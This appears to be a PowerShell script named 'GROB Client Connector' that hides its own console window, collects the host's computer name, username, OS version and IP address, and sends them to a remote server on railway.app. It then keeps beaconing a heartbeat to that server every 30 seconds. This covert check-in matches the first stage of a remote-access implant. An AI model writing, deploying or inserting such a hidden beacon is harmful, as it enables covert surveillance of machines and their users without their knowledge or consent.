# GROB Client Connector
# Hidden PowerShell script

# Hide PowerShell window
Add-Type -Name Window -Namespace Native -MemberDefinition '
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'
$consolePtr = [Native.Window]::GetConsoleWindow()
[Native.Window]::ShowWindow($consolePtr, 0)

# Get system information
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME
$uid = $args[0]

if (-not $uid) {
    $uid = "default-uid"
}

# Server configuration
$serverUrl = "https://glistening-mindfulness.up.railway.app"
$wsUrl = "wss://glistening-mindfulness.up.railway.app"

# Create system info payload
$systemInfo = @{
    uid = $uid
    computer_name = $computerName
    username = $username
    os_version = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    ip_address = (Test-Connection -ComputerName (Get-WmiObject Win32_OperatingSystem).CSName -Count 1 -ErrorAction SilentlyContinue | Select-Object -First 1).Address
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

# Convert to JSON
$jsonPayload = $systemInfo | ConvertTo-Json -Compress

# Send initial connection
try {
    $response = Invoke-RestMethod -Uri "$serverUrl/api/connect" -Method POST -Body $jsonPayload -ContentType "application/json" -TimeoutSec 10
    Write-Host "Connected successfully"
} catch {
    Write-Host "Connection failed: $_"
}

# Keep running and send periodic updates
while ($true) {
    try {
        # Send heartbeat
        $heartbeat = @{
            uid = $uid
            status = "online"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        }
        
        Invoke-RestMethod -Uri "$serverUrl/api/heartbeat" -Method POST -Body ($heartbeat | ConvertTo-Json -Compress) -ContentType "application/json" -TimeoutSec 5
        
        Start-Sleep -Seconds 30
    } catch {
        Start-Sleep -Seconds 60
    }
}
